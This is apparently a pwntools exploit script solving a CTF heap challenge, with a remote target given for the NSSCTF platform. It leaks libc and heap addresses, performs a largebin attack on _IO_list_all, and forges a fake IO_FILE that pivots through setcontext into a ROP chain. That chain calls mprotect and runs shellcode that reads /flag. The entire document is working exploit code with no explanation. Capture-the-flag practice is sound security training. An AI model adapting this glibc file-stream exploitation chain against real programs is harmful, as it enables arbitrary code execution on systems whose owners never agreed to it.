from pwn import *
from pwn import p64, u64
import sys
remote_addr = ["node1.anna.nssctf.cn",28424]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./vuln_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def add(idx, size):
    sla(b'>', b'1')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(size).encode())

def delete(idx):
    sla(b'>', b'2')
    sla(b'Index: ', str(idx).encode())

def edit(idx, content):
    sla(b'>', b'3')
    sla(b'Index: ', str(idx).encode())
    sa(b'Content: ', content)

def show(idx):
    sla(b'>', b'4')
    sla(b'Index: ', str(idx).encode())

debug('''
    b *$rebase(0x14d5)
    b *$rebase(0x15ca)
    b *$rebase(0x16b8)
    b *$rebase(0x1774)
    b *$rebase(0x1839)
''')

add(0, 0x510)
add(1, 0x500)
add(2, 0x500)
delete(0)
add(3, 0x520)
show(0)

leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak_addr - 0x1f70f0
pr('libc_base', libc_base)

IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
setcontext = libc_base + libc.sym['setcontext']
mprotect = libc_base + libc.sym['mprotect']
pop_rdx_rbx = libc_base + 0x8bbb9
pop_rdi = libc_base + 0x23ba5
pop_rsi = libc_base + 0x251fe
gadget = libc_base + 0x10ba6f
ret = pop_rdi + 1

edit(0, b'a' * 0x10)
show(0)
ru(b'a' * 0x10)
heap_addr = u64(rud(b'\n').ljust(8, b'\x00')) - 0x290
pr('heap_addr', heap_addr)

edit(0, p64(0) * 3 + p64(IO_list_all - 0x20))
delete(2)
add(4, 0x520)

fake_addr = heap_addr + 0xcc0
fake_IO_FILE = p64(0) * 3 + p64(1)
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heap_addr)
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE += p64(fake_addr + 0xe0)
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(IO_wfile_jumps)
fake_IO_FILE += p64(0) * 2 + p64(setcontext + 61)
fake_IO_FILE += p64(0) * 4 + p64(fake_addr + 0xe0)
fake_IO_FILE += b'\x00' * 0x28
fake_IO_FILE += p64(gadget)
fake_IO_FILE += b'\x00' * 0x30
fake_IO_FILE += p64(fake_addr + 0x200)
fake_IO_FILE += p64(ret)
fake_IO_FILE = fake_IO_FILE.ljust(0x1b0, b'\x00')
fake_IO_FILE += p64(fake_addr + 0xe0)
payload = fake_IO_FILE.ljust(0x1f0, b'\x00')

payload += flat(
    p64(pop_rdi), p64(heap_addr),
    p64(pop_rsi), p64(0x1000), 
    p64(pop_rdx_rbx), p64(7), p64(0),
    p64(mprotect),
    p64(fake_addr + 0x248)
)

payload += asm(shellcraft.cat('/flag'))
edit(2, payload)
sla(b'>', b'5')

shell()
